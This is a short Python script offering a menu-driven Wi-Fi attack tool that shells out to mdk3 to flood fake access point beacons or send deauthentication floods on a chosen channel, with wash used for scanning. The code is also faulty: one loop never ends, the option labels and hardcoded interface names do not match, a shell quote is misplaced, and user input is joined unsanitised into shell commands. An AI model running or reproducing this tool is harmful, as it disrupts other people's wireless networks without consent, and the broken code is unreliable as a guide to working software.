import os
import time
data1=input("1.Fake access points 2.Deauth 3.Scan networks: ")
wlandata=input("What is your adapter example wlan0mon: ")


if (data1=="1"):
    print("ACTIVE")
    xd=os.system("mdk3 " + wlandata + " b -t xx:xx:xx:xx:xx:xx -c X")
    while xd<1000:
        xd + 50


elif(data1=="2"):
    print("Scanning networks")
    os.system("gnome-terminal -e 'wash -i wlan0mon'")
    time.sleep(5)
    channelinput=input("Give me a channel number: ")
    print("ACTIVE")
    os.system("mdk3 "+ wlandata + " d -c " + channelinput)

elif(data1=="3"):
    print("Scanning")
    os.system("gnome-terminal -e 'wash -i '" + wlandata)





else:
    print ("choose from 1 to 3")
    pass
